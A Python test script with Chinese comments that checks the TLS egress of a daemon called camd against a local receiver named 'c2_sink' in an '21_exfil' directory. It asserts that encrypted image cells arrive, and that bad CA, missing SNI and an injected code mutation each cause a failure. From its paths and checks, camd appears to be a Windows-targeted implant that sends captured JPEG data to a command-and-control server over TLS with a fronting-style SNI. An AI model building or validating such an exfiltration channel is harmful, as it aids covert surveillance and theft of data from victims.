#!/usr/bin/env python3
"""
camd tls:// 出口端到端验证。

正向：真实 TLS 收端（Python ssl，底层 OpenSSL）+ 自研 TLS 1.2 客户端，
      断言握手成功、信元送达、线上仍无明文。
反向：三条注入，证明守卫不是恒绿。

刻意不用 socket connect 探测监听就绪——那会在收端留下一条 0 字节空连接
并计入 connections（上一轮刚修掉的缺陷）。改为轮询收端日志里的 listening。
"""
import os
import sys
import json
import time
import socket
import shutil
import tempfile
import subprocess

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
CAMD = os.path.join(ROOT, "agent_windows/build/linux/camd")
SINK = os.path.join(ROOT, "21_exfil/c2_sink.py")
CA = os.path.join(ROOT, "25_tls/tests/data/ca.pem")
BADCA = os.path.join(ROOT, "25_tls/tests/data/selfsigned.pem")
CERT = os.path.join(ROOT, "25_tls/tests/data/leaf.pem")
KEY = os.path.join(ROOT, "25_tls/tests/data/leaf.key")

# BASE 每次运行都取唯一目录。此前是仓库内固定路径 .verify_tls：
# 上一轮若异常退出留下残留，本轮开头的 rmtree 会抛
# "Directory not empty: 'r1'"，于是**断言全过（total fail=0）而进程
# rc=1**，make 报 Error 1。排查者会去查 TLS 握手，而真因是清理竞态——
# 症状与根因完全不对应。改为唯一目录后跨次污染不复存在。
BASE = None

PASS = 0
FAIL = 0


def chk(cond, name, extra=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("[PASS] %s" % name)
    else:
        FAIL += 1
        print("[FAIL] %s  %s" % (name, extra))


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def start_sink(outdir, cert=None, key=None):
    os.makedirs(outdir, exist_ok=True)
    port = free_port()
    stats = os.path.join(outdir, "stats.json")
    log = os.path.join(outdir, "c2.log")
    cmd = [sys.executable, SINK, "--port", str(port), "--out",
           os.path.join(outdir, "inbox"), "--stats", stats, "--log", log]
    if cert:
        cmd += ["--cert", cert, "--key", key]
    out = open(os.path.join(outdir, "stdout.log"), "wb")
    p = subprocess.Popen(cmd, stdout=out, stderr=subprocess.STDOUT,
                         stdin=subprocess.DEVNULL, start_new_session=True)
    # 等日志出现 listening（不 connect，避免污染 connections）
    for _ in range(120):
        if p.poll() is not None:
            break
        try:
            if "listening" in open(log, "r", errors="replace").read():
                break
        except OSError:
            pass
        time.sleep(0.1)
    # 收端进程已退出 = 起失败。必须显式拒绝继续：
    # 不判的话后面会拿到 bytes=0，而正向断言报成 "TLS 握手 transport
    # error"，把排查方向引到发送回调契约（上一轮刚修过的缺陷）；真正的
    # 根因——收端根本没起来，例如证书文件瞬时读不到——则被完全掩盖。
    # 实测发生过：同一路径 ls 显示存在、python 随即 exists() 返回 False，
    # 症状却长成握手错误。
    if p.poll() is not None:
        try:
            msg = open(os.path.join(outdir, "stdout.log"), "r",
                       errors="replace").read().strip()
        except OSError:
            msg = ""
        raise SystemExit("[FATAL] 收端进程已退出（未启动）: %s"
                         % (msg or "(无输出)"))
    return p, port, stats, log


def stop(p):
    if p and p.poll() is None:
        try:
            os.killpg(os.getpgid(p.pid), 15)
        except Exception:
            pass
        try:
            p.wait(timeout=10)
        except Exception:
            try:
                os.killpg(os.getpgid(p.pid), 9)
            except Exception:
                pass


def run_camd(tag, sink, extra, root, timeout=90):
    # 64 个十六进制字符 = 32 字节：前 16 字节 k_send，后 16 字节 k_recv。
    # k_send 与 k_recv 必须不同——相同会让 exfil_chan_init 返回 -4，而 -4
    # 完全看不出成因（见 cam_daemon_main.c 的前置拦截说明）。
    key = ("0123456789abcdef0123456789abcdef" +
           "fedcba9876543210fedcba9876543210")
    assert len(key) == 64
    cmd = [CAMD, "--sink", sink, "--key", key, "--backend", "mock",
           "--batches", "1", "--interval-ms", "50", "--root", root]
    cmd += extra
    try:
        r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           timeout=timeout)
        return (r.returncode,
                r.stdout.decode("utf-8", "replace"),
                r.stderr.decode("utf-8", "replace"))
    except subprocess.TimeoutExpired:
        return -99, "", "TIMEOUT"


SRC = os.path.join(ROOT, "agent_windows/src/cam_daemon.c")
GOOD = "return (int)n;              /* <=0 由 io_send_all 判为失败 */"
BAD = "return (n == (ssize_t)len) ? 0 : -1;   /* MUTATED */"


def mutate(restore=False):
    """把 cd_tls_send 的返回值契约改回错误写法（或还原）。

    为什么必须注入这一条：tls.h 注释与 io_send_all 实现相反，照注释写会
    在第一次发送成功后被就地判 IO 错误。若不主动注入，这个缺陷会以
    "握手 transport error" 的面目复发，而没有任何断言会变红。
    """
    bak = SRC + ".bak"
    if restore:
        if os.path.exists(bak):
            shutil.copy(bak, SRC)
            os.remove(bak)
        return
    if not os.path.exists(bak):
        shutil.copy(SRC, bak)
    txt = open(SRC, "r").read()
    if GOOD not in txt:
        raise SystemExit("[FATAL] 锚点未找到，注入未生效")
    open(SRC, "w").write(txt.replace(GOOD, BAD, 1))


def rebuild():
    r = subprocess.run(["make", "-C", os.path.join(ROOT, "agent_windows"),
                        "build/linux/camd"], capture_output=True, timeout=600)
    return r.returncode


def inbox_head(outdir, limit=8192):
    """读出落盘信元的头部字节，用于判明文泄漏。"""
    d = os.path.join(outdir, "inbox")
    buf = b""
    for root, _, files in os.walk(d):
        for f in sorted(files):
            try:
                with open(os.path.join(root, f), "rb") as fh:
                    buf += fh.read(limit)
            except OSError:
                pass
            if len(buf) >= limit:
                break
        if len(buf) >= limit:
            break
    return buf[:limit]


def bytes_recv(stats):
    try:
        d = json.load(open(stats))
        return int(d.get("total_bytes", 0))
    except Exception:
        return 0


def inbox_bytes(outdir):
    d = os.path.join(outdir, "inbox")
    n = 0
    for root, _, files in os.walk(d):
        for f in files:
            try:
                n += os.path.getsize(os.path.join(root, f))
            except OSError:
                pass
    return n


def main():
    # 前置：本仓库自身产物必须齐备。缺失即明确 FATAL，不静默跳过——
    # 接入 make test 之后，"缺产物"若被当成通过，就是"从没验证"冒充
    # "验证通过"。这与缺 openssl 报 77 SKIP 是两回事：后者是环境不具备，
    # 前者是本仓库没构建，构建出来即可。
    for f in (CAMD, SINK, CA, BADCA, CERT, KEY):
        if not os.path.exists(f):
            raise SystemExit("[FATAL] 缺少必需产物: %s" % f)
    global BASE
    # 工作目录必须落在持久位置：收端的 --out/--stats/--log 与 camd 的 --root
    # 都挂在这里。默认 tempfile 落在 /tmp，而本沙盒已多次实测 /tmp 被整体
    # 清空（502 之后），目录中途消失会让收端写入失败、camd 建根失败，
    # 症状却长成 "TLS 握手 transport error" —— 排查被引向发送回调契约
    # （那是上一轮刚修好、本来正确的代码）。
    # 优先 /data（沙盒持久工作区），不可用时退回默认临时目录。
    _base_dir = "/data" if (os.path.isdir("/data") and os.access("/data", os.W_OK)) else None
    BASE = tempfile.mkdtemp(prefix="vtls_", dir=_base_dir)

    # ---------- 正向：真实 TLS 收端 ----------
    print("=== 正向：tls:// 出口 + 真实 TLS 收端 ===")
    d1 = os.path.join(BASE, "pos")
    p, port, stats, log = start_sink(d1, CERT, KEY)
    rc, out, err = run_camd("pos", "tls://127.0.0.1:%d" % port,
                            ["--ca", CA, "--sni", "front.test"],
                            os.path.join(d1, "root"))
    time.sleep(1.0)
    stop(p)
    time.sleep(0.5)

    lg = ""
    try:
        lg = open(log, "r", errors="replace").read()
    except OSError:
        pass

    n = bytes_recv(stats)
    chk(rc == 0, "camd 退出码 0", "rc=%d err=%s" % (rc, err[:300]))
    chk(n > 0, "收端收到信元字节", "bytes=%d" % n)
    chk("tls=True" in lg, "收端以 TLS 模式运行", "log=%s" % lg[:200])
    chk(inbox_bytes(d1) > 0, "信元已落盘", "bytes=%d" % inbox_bytes(d1))
    head = inbox_head(d1)
    chk(b"\xff\xd8\xff" not in head,
        "线上不得出现 JPEG magic（信元仍是密文）",
        "head=%s" % head[:16].hex())
    print("      rc=%d bytes=%d" % (rc, n))
    if rc != 0:
        print("      stderr: %s" % err[:400])

    # ---------- 反向 R1：要求校验却没给 --ca ----------
    print("=== 反向 R1：tls:// 未给 --ca（默认要求校验）===")
    d2 = os.path.join(BASE, "r1")
    p, port, stats, log = start_sink(d2, CERT, KEY)
    rc1, _, err1 = run_camd("r1", "tls://127.0.0.1:%d" % port,
                            ["--sni", "front.test"], os.path.join(d2, "root"))
    time.sleep(0.6)
    stop(p)
    time.sleep(0.4)
    n1 = bytes_recv(stats)
    chk(rc1 != 0, "R1 必须拒绝启动", "rc=%d" % rc1)
    chk(n1 == 0, "R1 收端不得收到字节", "bytes=%d" % n1)
    chk("未指定 --ca" in err1, "R1 报出可操作的诊断", "err=%s" % err1[:200])

    # ---------- 反向 R2：给了错误 CA ----------
    print("=== 反向 R2：证书链校验失败（错误 CA）===")
    d3 = os.path.join(BASE, "r2")
    p, port, stats, log = start_sink(d3, CERT, KEY)
    rc2, _, err2 = run_camd("r2", "tls://127.0.0.1:%d" % port,
                            ["--ca", BADCA, "--sni", "front.test"],
                            os.path.join(d3, "root"))
    time.sleep(0.6)
    stop(p)
    time.sleep(0.4)
    n2 = bytes_recv(stats)
    chk(rc2 != 0, "R2 必须拒绝（证书不可信）", "rc=%d" % rc2)
    chk(n2 == 0, "R2 收端不得收到字节", "bytes=%d" % n2)

    # ---------- 反向 R3：目标是 IP 且未给 --sni ----------
    print("=== 反向 R3：IP 目标 + 未给 --sni（无法做主机名校验）===")
    d4 = os.path.join(BASE, "r3")
    p, port, stats, log = start_sink(d4, CERT, KEY)
    rc3, _, err3 = run_camd("r3", "tls://127.0.0.1:%d" % port,
                            ["--ca", CA], os.path.join(d4, "root"))
    time.sleep(0.6)
    stop(p)
    time.sleep(0.4)
    n3 = bytes_recv(stats)
    chk(rc3 != 0, "R3 必须拒绝启动", "rc=%d" % rc3)
    chk(n3 == 0, "R3 收端不得收到字节", "bytes=%d" % n3)

    # ---------- 反向 R4：send 回调契约退回错误写法 ----------
    print("=== 反向 R4：cd_tls_send 退回错误契约（证明修复被守护）===")
    try:
        mutate(False)
        rc_b = rebuild()
        d5 = os.path.join(BASE, "r4")
        p, port, stats, log = start_sink(d5, CERT, KEY)
        rc4, _, err4 = run_camd("r4", "tls://127.0.0.1:%d" % port,
                                ["--ca", CA, "--sni", "front.test"],
                                os.path.join(d5, "root"))
        time.sleep(0.6)
        stop(p)
        time.sleep(0.4)
        n4 = bytes_recv(stats)
        chk(rc_b == 0, "R4 变异体编译成功（注入确实生效）", "make rc=%d" % rc_b)
        chk(rc4 != 0, "R4 握手必须失败", "rc=%d err=%s" % (rc4, err4[:200]))
        chk(n4 == 0, "R4 收端不得收到字节", "bytes=%d" % n4)
    finally:
        mutate(True)
        rc_r = rebuild()
        chk(rc_r == 0, "R4 还原后重建成功", "make rc=%d" % rc_r)

    print("")
    print("total=%d pass=%d fail=%d" % (PASS + FAIL, PASS, FAIL))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
